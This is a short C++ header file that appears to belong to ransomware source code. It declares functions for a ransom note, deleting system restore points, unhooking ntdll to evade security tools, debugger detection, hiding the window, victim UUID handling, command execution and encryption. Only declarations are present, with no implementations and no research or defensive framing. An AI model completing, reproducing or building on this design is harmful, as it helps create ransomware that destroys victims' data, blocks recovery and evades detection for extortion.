#ifndef SIRI_UTILS_HPP
#define SIRI_UTILS_HPP

#include "file.hpp"
#include "sxor.hpp"
#include "master.hpp"
#include "encrypt.hpp"

#define UUID_LENGTH 36
#define RANDOM_RANGE 16

int onlyMe();
char *getUUID();
void saveUUID();
void hideWindow();
void ransomNote();
void unhookNtdll();
char *generateUUID();
bool isDebuggerPresent();
void DeleteRestorePoints();
int calculatePrimeNo(int n);
void executeCommand(const char *command);

#endif